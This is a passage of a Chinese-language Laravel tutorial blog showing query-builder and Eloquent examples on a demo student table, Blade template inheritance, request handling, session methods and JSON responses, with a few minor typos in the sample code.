class=\"string\">'sex'</span> =&gt; <span class=\"string\">'female'</span>, <span class=\"string\">'class'</span> =&gt; <span class=\"string\">'1513011'</span>,</span><br><span class=\"line\">            <span class=\"string\">'in_time'</span> =&gt; <span class=\"string\">'2015'</span>, <span class=\"string\">'status'</span> =&gt; <span class=\"string\">'stay_in'</span>]</span><br><span class=\"line\">        ]);</span><br><span class=\"line\">        var_dump($bool);</span><br><span class=\"line\"></span><br><span class=\"line\">        $num = DB::table(<span class=\"string\">'student'</span>)-&gt;where(<span class=\"string\">'id'</span>, <span class=\"string\">'15130110067'</span>)-&gt;update(<span class=\"string\">'in_time'</span> =&gt; <span class=\"string\">'2016'</span>);</span><br><span class=\"line\">        var_dump($num);</span><br><span class=\"line\">        $num DB::table(<span class=\"string\">'student'</span>)-&gt;increment(<span class=\"string\">'class'</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">        var_dump($num);</span><br><span class=\"line\">        $num = DB::table(<span class=\"string\">'student'</span>)-&gt;where(<span class=\"string\">'id'</span>, <span class=\"string\">'&gt;='</span>, <span class=\"string\">'15130110067'</span>)-&gt;delete();</span><br><span class=\"line\">        var_dump($num);</span><br><span class=\"line\">        DB::table(<span class=\"string\">'student'</span>)-&gt;truncate();   <span class=\"comment\">// delete all data in table</span></span><br><span class=\"line\"></span><br><span class=\"line\">        $students = DB::table(<span class=\"string\">'student'</span>)-&gt;get();     <span class=\"comment\">// return all data</span></span><br><span class=\"line\">        dd($students);</span><br><span class=\"line\">        $student = DB::table(<span class=\"string\">'student'</span>)-&gt;orderBy(<span class=\"string\">'id'</span>, <span class=\"string\">'desc'</span>)-&gt;first();</span><br><span class=\"line\">        dd($student);</span><br><span class=\"line\">        $names = DB::table(<span class=\"string\">'student'</span>)-&gt;pluck(<span class=\"string\">'name'</span>);    <span class=\"comment\">// return name attrubite</span></span><br><span class=\"line\">        dd($names);</span><br><span class=\"line\">        $names = DB::table(<span class=\"string\">'student'</span>)-&gt;lists(<span class=\"string\">'name'</span>, <span class=\"string\">'id'</span>);  <span class=\"comment\">// return id -&gt; name(now this is removed)</span></span><br><span class=\"line\">        dd($names);</span><br><span class=\"line\">        $names = DB::table(<span class=\"string\">'student'</span>)-&gt;select(<span class=\"string\">'id'</span>, <span class=\"string\">'name'</span>, <span class=\"string\">'sex'</span>)-&gt;get();   <span class=\"comment\">// return attrubites</span></span><br><span class=\"line\">        dd($names);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;pre&gt;'</span>;</span><br><span class=\"line\">        DB::table(<span class=\"string\">'student'</span>)-&gt;chunk(<span class=\"number\">2</span>, <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">($students)</span> </span>&#123;</span><br><span class=\"line\">            var_dump($students);</span><br><span class=\"line\">        &#125;);     <span class=\"comment\">// for big data query, query 2 data every time</span></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>这个方法可以避免sql攻击注入，同时也人性化很多,还有很多内容，具体查看官方文档</strong><br><a href=\"https://laravel.com/docs/5.4/queries\">database</a></p>\n<p><strong>3.Eloquent ORM</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">// app\\Student.php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">App</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Illuminate</span>\\<span class=\"title\">Database</span>\\<span class=\"title\">Eloquent</span>\\<span class=\"title\">Model</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Flight</span> <span class=\"keyword\">extends</span> <span class=\"title\">Model</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/**</span><br><span class=\"line\">     * The table associated with the model.</span><br><span class=\"line\">     *</span><br><span class=\"line\">     * <span class=\"doctag\">@var</span> string</span><br><span class=\"line\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> $table = <span class=\"string\">'student'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> $primaryKey = <span class=\"string\">'id'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// app\\Http\\Controllers\\StudentController.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">App</span>\\<span class=\"title\">Http</span>\\<span class=\"title\">Controllers</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">App</span>\\<span class=\"title\">Student</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">StudentController</span> <span class=\"keyword\">extends</span> <span class=\"title\">Controller</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        $students = Student::all();</span><br><span class=\"line\">        $students = Student::find(<span class=\"string\">'15130110067'</span>)</span><br><span class=\"line\">        dd($students);</span><br><span class=\"line\"></span><br><span class=\"line\">        $student = <span class=\"keyword\">new</span> Student();</span><br><span class=\"line\">        $student-&gt;ID = <span class=\"string\">'15130110070'</span>;</span><br><span class=\"line\">        $student-&gt;name = <span class=\"string\">'小青'</span>;</span><br><span class=\"line\">        $student-&gt;sex = <span class=\"string\">'female'</span>;</span><br><span class=\"line\">        $student-&gt;class = <span class=\"string\">'1513011'</span>;</span><br><span class=\"line\">        $student-&gt;in_time = <span class=\"string\">'2015'</span>;</span><br><span class=\"line\">        $student-&gt;status = <span class=\"string\">'stay_in'</span>;</span><br><span class=\"line\">        $bool = $student-&gt;save();</span><br><span class=\"line\">        dd($bool);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// ORM 正则搜索</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">search</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    $keyword = $request-&gt;keyword;</span><br><span class=\"line\">    $keyword = <span class=\"string\">'%'</span> . $keyword . <span class=\"string\">'%'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// $books = DB::select('SELECT * FROM books WHERE keywords LIKE ?', [$keyword]);</span></span><br><span class=\"line\">    $books = Book::where(<span class=\"string\">'keywords'</span>, <span class=\"string\">'LIKE'</span>, $keyword)-&gt;paginate(<span class=\"number\">12</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($books-&gt;total()) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> view(<span class=\"string\">'book.searchResults'</span>, [</span><br><span class=\"line\">            <span class=\"string\">'books'</span> =&gt; $books,</span><br><span class=\"line\">        ]);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> view(<span class=\"string\">'book.searchNoFound'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>具体内容查看官方文档</strong><br><a href=\"https://laravel.com/docs/5.4/eloquent\">ORM</a></p>\n<h2 id=\"blade模板\"><a href=\"#blade模板\" class=\"headerlink\" title=\"blade模板\"></a>blade模板</h2><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// views\\layout.blade.php</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang=\"en\"&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=\"utf-8\"&gt;</span><br><span class=\"line\">    &lt;title&gt;laravel模板继承&lt;/title&gt;</span><br><span class=\"line\">    &lt;style&gt;</span><br><span class=\"line\">        .header &#123;</span><br><span class=\"line\">            width: 1000px;</span><br><span class=\"line\">            height: 150px;</span><br><span class=\"line\">            margin: 0 auto;</span><br><span class=\"line\">            background: #f5f5f5;</span><br><span class=\"line\">            border: 1px solid #ddd;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        .main &#123;</span><br><span class=\"line\">            width: 1000px;</span><br><span class=\"line\">            height: 300px;</span><br><span class=\"line\">            margin: 0 auto;</span><br><span class=\"line\">            margin-top: 15px;</span><br><span class=\"line\">            clear: both;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        .main .sidebar &#123;</span><br><span class=\"line\">            float: left;</span><br><span class=\"line\">            width: 20%;</span><br><span class=\"line\">            height: inherit;</span><br><span class=\"line\">            background: #f5f5f5;</span><br><span class=\"line\">            border: 1px solid #ddd;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        .main .content &#123;</span><br><span class=\"line\">            float: right;</span><br><span class=\"line\">            width: 75%;</span><br><span class=\"line\">            height: inherit;</span><br><span class=\"line\">            background: #f5f5f5;</span><br><span class=\"line\">            border: 1px solid #ddd;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        .footer &#123;</span><br><span class=\"line\">            width: 1000px;</span><br><span class=\"line\">            height: 150px;</span><br><span class=\"line\">            margin: 0 auto;</span><br><span class=\"line\">            margin-top: 15px;</span><br><span class=\"line\">            background: #f5f5f5;</span><br><span class=\"line\">            border: 1px solid #ddd;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &lt;/style&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">    &lt;div class='header'&gt;</span><br><span class=\"line\">        @section('header')</span><br><span class=\"line\">        头部</span><br><span class=\"line\">        @show</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;div class='main'&gt;</span><br><span class=\"line\">        &lt;div class='sidebar'&gt;</span><br><span class=\"line\">            @section('sidebar')</span><br><span class=\"line\">            侧边栏</span><br><span class=\"line\">            @show</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">        &lt;div class='content'&gt;</span><br><span class=\"line\">            @yield('content', '主要内容')</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;div class=\"footer\"&gt;</span><br><span class=\"line\">        @section('footer')</span><br><span class=\"line\">        尾部</span><br><span class=\"line\">        @show</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// views\\student\\test.php</span><br><span class=\"line\">@extends('layout')</span><br><span class=\"line\"></span><br><span class=\"line\">@section('header')</span><br><span class=\"line\">    @parent</span><br><span class=\"line\">    header</span><br><span class=\"line\">@stop</span><br><span class=\"line\"></span><br><span class=\"line\">@section('sidebar')</span><br><span class=\"line\">    sidebar</span><br><span class=\"line\">@stop</span><br><span class=\"line\"></span><br><span class=\"line\">@section('content')</span><br><span class=\"line\">    content</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;!-- 1.模板中输出变量 --&gt;</span><br><span class=\"line\">    &lt;p&gt;&#123;&#123; $name &#125;&#125;&lt;/p&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;!-- 2.模板中调用PHP代码 --&gt;</span><br><span class=\"line\">    &lt;p&gt;&#123;&#123; time() &#125;&#125;&lt;/p&gt;</span><br><span class=\"line\">    &lt;p&gt;&#123;&#123; date('Y-m-d H:i:s', time()) &#125;&#125;&lt;/p&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;!-- 3.原样输出 --&gt;</span><br><span class=\"line\">    &lt;p&gt;@&#123;&#123; $name &#125;&#125;&lt;/p&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#123;&#123;-- 4.模板中注释 --&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#123;&#123;-- 5.引入子视图 --&#125;&#125;</span><br><span class=\"line\">    @include('student.commen', ['message' =&gt; '我是错误信息'])</span><br><span class=\"line\"></span><br><span class=\"line\">    @if ($name == 'fenlan')</span><br><span class=\"line\">        I'm fenlan</span><br><span class=\"line\">    @elseif ($name == 'hello')</span><br><span class=\"line\">        I'm hello</span><br><span class=\"line\">    @else</span><br><span class=\"line\">        Who am I?</span><br><span class=\"line\">    @endif</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;br&gt;</span><br><span class=\"line\">    @unless ($name != 'fenlan')</span><br><span class=\"line\">        I'm fenlan</span><br><span class=\"line\">    @endunless</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;br&gt;</span><br><span class=\"line\">    @for ($i=0; $i &lt; 10; $i++)</span><br><span class=\"line\">        &#123;&#123; $i &#125;&#125;</span><br><span class=\"line\">    @endfor</span><br><span class=\"line\"></span><br><span class=\"line\">@stop</span><br></pre></td></tr></table></figure>\n<h2 id=\"Requests\"><a href=\"#Requests\" class=\"headerlink\" title=\"Requests\"></a>Requests</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">App</span>\\<span class=\"title\">Http</span>\\<span class=\"title\">Controllers</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">App</span>\\<span class=\"title\">Student</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Illuminate</span>\\<span class=\"title\">Http</span>\\<span class=\"title\">Request</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">StudentController</span> <span class=\"keyword\">extends</span> <span class=\"title\">Controller</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 1.取值</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $request-&gt;input(<span class=\"string\">'name'</span>, <span class=\"string\">'default'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $request-&gt;has(<span class=\"string\">'name'</span>);</span><br><span class=\"line\">        $res = $request-&gt;all();</span><br><span class=\"line\">        dd($res);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 2.判断请求类型</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $request-&gt;method();</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $request-&gt;isMethod(<span class=\"string\">'GET'</span>);</span><br><span class=\"line\">        $res = $request-&gt;is(<span class=\"string\">'student/*'</span>);</span><br><span class=\"line\">        var_dump($res);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Session\"><a href=\"#Session\" class=\"headerlink\" title=\"Session\"></a>Session</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// routes\\web.php</span></span><br><span class=\"line\">Route::group([<span class=\"string\">'middleware'</span> =&gt; [<span class=\"string\">'web'</span>]], <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">   Route::any(<span class=\"string\">'session1'</span>, <span class=\"string\">'StudentController@session1'</span>);</span><br><span class=\"line\">   Route::any(<span class=\"string\">'session2'</span>, <span class=\"string\">'StudentController@session2'</span>);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 1.Http request session();</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">session1</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\">        $request-&gt;session()-&gt;put(<span class=\"string\">'key1'</span>, <span class=\"string\">'value1'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">session2</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $request-&gt;session()-&gt;get(<span class=\"string\">'key1'</span>);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 2.sesson()</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">session1</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\">        session()-&gt;put(<span class=\"string\">'key2'</span>, <span class=\"string\">'value2'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">session2</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> session()-&gt;get(<span class=\"string\">'key2'</span>);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 3.Session class</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">session1</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\">        Session::put(<span class=\"string\">'key3'</span>, <span class=\"string\">'value3'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">session2</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> session::get(<span class=\"string\">'key3'</span>, <span class=\"string\">'default'</span>);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">session1</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\">        Session::push(<span class=\"string\">'student'</span>, <span class=\"string\">'fenlan'</span>);</span><br><span class=\"line\">        Session::push(<span class=\"string\">'student'</span>, <span class=\"string\">'shirk3'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">session2</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\">        $res = Session::get(<span class=\"string\">'student'</span>, <span class=\"string\">'default'</span>);</span><br><span class=\"line\">        dd($res);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">session1</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\">        Session::forget(<span class=\"string\">'student'</span>);</span><br><span class=\"line\">        Session::flush(<span class=\"string\">'key'</span>, <span class=\"string\">'default'</span>);\t<span class=\"comment\">// temporary</span></span><br><span class=\"line\">        Session::flush();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">session2</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\">    \t<span class=\"keyword\">echo</span> Session::has(<span class=\"string\">'student'</span>);\t\t<span class=\"comment\">// return bool</span></span><br><span class=\"line\">        $res = Session::pull(<span class=\"string\">'student'</span>, <span class=\"string\">'default'</span>);</span><br><span class=\"line\">        dd($res);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Response\"><a href=\"#Response\" class=\"headerlink\" title=\"Response\"></a>Response</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 响应json</span></span><br><span class=\"line\">        $data = [</span><br><span class=\"line\">          <span class=\"string\">'errCode'</span> =&gt; <span class=\"number\">0</span>,</span><br><span class=\"line\">          <span class=\"string\">'errMsg'</span> =&gt; <span class=\"string\">'success'</span>,</span><br><span class=\"line\">          <span class=\"string\">'data'</span> =&gt; <span class=\"string\">'fenlan'</span>,</span><br><span class=\"line\">        ];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> response()-&gt;json($data);</span><br><span 